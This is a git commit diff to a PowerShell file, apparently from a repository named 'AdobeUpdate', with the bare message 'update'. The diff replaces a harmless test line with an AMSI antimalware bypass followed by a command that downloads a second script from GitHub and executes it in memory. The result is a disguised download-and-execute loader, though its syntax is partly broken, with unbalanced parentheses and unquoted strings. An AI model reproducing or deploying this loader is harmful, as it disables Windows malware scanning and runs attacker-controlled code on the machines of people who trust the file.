58ecd4defd25d24a5615aef3e2a3de29d49b0596
burnitup545 <96095116+burnitup545@users.noreply.github.com>
2021-12-16 10:00:58 -0800

    update

--- lib1.ps1
+++ lib1.ps1
@@ -1,1 +1,3 @@
- "hello world" | Out-File -FilePath $env:USERPROFILE\Desktop\worked.txt
+IEX (
+[Ref].Assembly.GetType(System.Management.Automation.AmsiUtils).GetField((amsiInitFailed,NonPublic,Static)).SetValue($null,$true)
+IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib3.ps1')))
